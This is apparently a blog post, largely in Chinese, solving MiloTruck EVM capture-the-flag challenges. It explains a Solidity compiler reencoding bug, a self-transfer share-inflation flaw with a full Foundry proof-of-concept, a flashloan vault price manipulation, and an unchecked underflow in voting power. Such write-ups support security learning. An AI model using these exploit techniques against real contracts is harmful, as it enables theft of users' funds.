---
title: MiloTruck EVM-CTF Solutions
author: KK
pubDatetime: 2024-09-12T12:34:56Z
slug: MiloTruckEVMCTFSolutions
featured: false
draft: false
tags:
  - Solidity
  - CTF
ogImage: ""
description: This is the Solutions for MiloTruck EVM-CTF.
---

# Escrow

## Code

- DualAssetEscrow
- EscrowFactory
- Setup

# Gnosis-Safe

Root Cause是[https://soliditylang.org/blog/2022/08/08/calldata-tuple-reencoding-head-overflow-bug/](https://soliditylang.org/blog/2022/08/08/calldata-tuple-reencoding-head-overflow-bug/)，题目中Transaction的定义是:

```solidity
 struct Transaction {
        address signer;
        address to;
        uint256 value;
        bytes data;
    }
```

最后一个元素是`bytes` 动态元素，所以在`aggressive cleanup`的时候就会被清理成0.从而导致了绕过。

# Greyhats-dollar

### Solutions

Self Transfer in `transferFrom()`

```
function transferFrom(address from, address to, uint256 amount) public update returns (bool) {
        if (from != msg.sender) allowance[from][msg.sender] -= amount;

        uint256 _shares = _GHDToShares(amount, conversionRate, false);
        uint256 fromShares = shares[from] - _shares;
        uint256 toShares = shares[to] + _shares;

        require(_sharesToGHD(fromShares, conversionRate, false) < balanceOf(from), "amount too small");
        require(_sharesToGHD(toShares, conversionRate, false) > balanceOf(to), "amount too small");

        shares[from] = fromShares;
        shares[to] = toShares;

        emit Transfer(from, to, amount);

        return true;
    }
```

### POC

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "src/greyhats-dollar/Setup.sol";
import "src/greyhats-dollar/GHD.sol";
import "src/greyhats-dollar/lib/GREY.sol";

contract GreyHatsDollar is Test {
    Setup setup;
    address player = makeAddr("player");
    GHD ghd;
    GREY grey;

    function setUp() public {
        setup = new Setup();
        ghd = setup.ghd();
        grey = setup.grey();
    }

    function test_grayhats() public {
        vm.startPrank(player);
        setup.claim();

        assertEq(grey.balanceOf(player), 1000e18);
        grey.approve(address(ghd), type(uint256).max);
        ghd.mint(1000e18);
        console.log("sharesOfPlayer: %e", ghd.shares(player));
        ghd.transferFrom(player, player, 1000e18);
        console.log("sharesOfPlayer2: %e", ghd.shares(player));
        ghd.transferFrom(player, player, 1000e18);
        console.log("sharesOfPlayer3: %e", ghd.shares(player));
        ghd.transferFrom(player, player, 1000e18);
        console.log("sharesOfPlayer4: %e", ghd.shares(player));
        ghd.transferFrom(player, player, 1000e18);
        console.log("sharesOfPlayer5: %e", ghd.shares(player));
        ghd.transferFrom(player, player, 5_000e18);
        ghd.transferFrom(player, player, 10_000e18);
        ghd.transferFrom(player, player, 10_000e18);
        ghd.transferFrom(player, player, 10_000e18);
        ghd.transferFrom(player, player, 10_000e18);
        bool isSolved = setup.isSolved();
        console.log("isSolved: %s", isSolved);
        vm.stopPrank();
    }
}
```

# Meta-staking

### Code

# Simple-amm-Vault

### Solution

在初始化后，各个合约的状态是：

| Vault             |              |
| ----------------- | ------------ |
| totalAssets(Grey) | 2000e18      |
| totalSupply       | 1000e18      |
| sharePrice        | 2:1(Grey:SV) |

| AMM      |         |
| -------- | ------- |
| k        | 2000e18 |
| reserveX | 1000e18 |
| reserveY | 2000e18 |

因为amm有flashloan，所以我们可以先flashloan出来1000e18的sv，然后用这1000e18的sv从Vaule中提取出2000e18的grey，在存入1000e18的grey这时候状态就变成了

| Vault             |              |
| ----------------- | ------------ |
| totalAssets(Grey) | 1000e18      |
| totalSupply       | 1000e18      |
| sharePrice        | 1:1(Grey:SV) |

由于amm的价格依赖于vault，所以这时候我们不需要任何的amountIn就可以换出1000e18的grey，从而完成挑战

# Voting-vault

虽然版本是>0.8.0, 但是在`_subtractVotingPower` 是用来`unchecked` ，从而导致溢出，所以只要投几次票，然后转移给任意地址，就可以触发溢出从而让我们有大量的votes。